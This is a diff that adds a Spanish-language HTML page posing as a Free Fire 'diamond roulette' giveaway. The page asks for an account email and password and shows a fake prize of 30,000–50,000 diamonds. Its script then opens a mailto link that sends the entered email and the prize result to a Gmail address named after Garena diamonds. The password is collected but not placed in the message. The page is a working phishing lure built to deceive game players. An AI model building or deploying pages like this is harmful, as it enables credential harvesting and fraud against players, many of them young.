@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar Sesión y Ruleta de Diamantes</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 20px;
+        }
+        .form-login {
+            background: #fff;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            margin: auto;
+        }
+        h2 {
+            text-align: center;
+        }
+        div {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+        }
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 8px;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #28a745;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #218838;
+        }
+        .resultado-ruleta {
+            margin-top: 20px;
+            text-align: center;
+        }
+        .hidden {
+            display: none;
+        }
+        .message {
+            color: red;
+            text-align: center;
+            margin-top: 20px;
+        }
+        .thank-you-section {
+            margin-top: 30px; /* Espacio entre secciones */
+            text-align: center; /* Centrar el texto */
+            background-image: url('https://via.placeholder.com/400x200?text=DIAMANTE'); /* Imagen de fondo */
+            background-size: cover; /* Ajustar la imagen al contenedor */
+            padding: 20px; /* Espaciado interno */
+            border-radius: 5px; /* Bordes redondeados */
+        }
+    </style>
+</head>
+<body>
+
+<section class="form-login">
+    <h2>Iniciar Sesión</h2>
+    
+    <form id="loginForm">
+        <div>
+            <label for="correo">Correo:</label>
+            <input type="text" id="correo" name="correo" required>
+        </div>
+
+        <div>
+            <label for="contrasena">Contraseña:</label>
+            <input type="password" id="contrasena" name="contrasena" required>
+        </div>
+
+        <button type="submit">Iniciar Sesión</button>
+    </form>
+
+    <div class="resultado-ruleta hidden" id="rouletteSection">
+        <h2>Ruleta</h2>
+        <p id="ruletaResult"></p>
+    </div>
+
+    <!-- Sección para mostrar el mensaje de agradecimiento y la ruta -->
+    <div id="thankYouSection" class="thank-you-section hidden">
+        <p id="thankYouMessage" class="message"></p>
+    </div>
+
+</section>
+
+<script>
+    document.getElementById('loginForm').addEventListener('submit', function(event) {
+        event.preventDefault();
+
+        // Mostrar la sección de la ruleta
+        document.getElementById('rouletteSection').classList.remove('hidden');
+
+        // Generar un número aleatorio de la ruleta
+        const options = [30000, 40000, 50000];
+        const result = options[Math.floor(Math.random() * options.length)];
+
+        // Mostrar el resultado de la ruleta
+        document.getElementById('ruletaResult').innerText = 'Resultado de la ruleta: ' + result + ' diamantes';
+
+        // Mostrar el mensaje de agradecimiento
+        const thankYouMessage = `Gracias por iniciar sesión con su cuenta. Se le ha acreditado ${result} diamantes a su cuenta. ESPERE 24h PARA RECLAMAR SU PREMIO SOBREVIDENTE.`;
+        
+        document.getElementById('thankYouMessage').innerText = thankYouMessage;
+
+        // Mostrar el contenedor del mensaje
+        document.getElementById('thankYouSection').classList.remove('hidden');
+
+        // Enviar correo electrónico
+        const correo = document.getElementById('correo').value; 
+        const email = 'garenafreefirediamtes@gmail.com'; 
+        const subject = 'Detalles de Inicio de Sesión';
+        
+        // Crear cuerpo del mensaje
+        const body = `Inicio de sesión:\nCorreo: ${correo}\nResultado de la ruleta: ${result} diamantes`;
+        
+        const mailtoLink = `mailto:${email}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+        
+        // Abrir enlace mailto después de 2.9 segundos (2900 ms)
+        setTimeout(() => {
+            window.location.href = mailtoLink; 
+        }, 2900); // Esperar 2.9 segundos antes de abrir el correo
+    });
+</script>
+
+</body>
+</html>
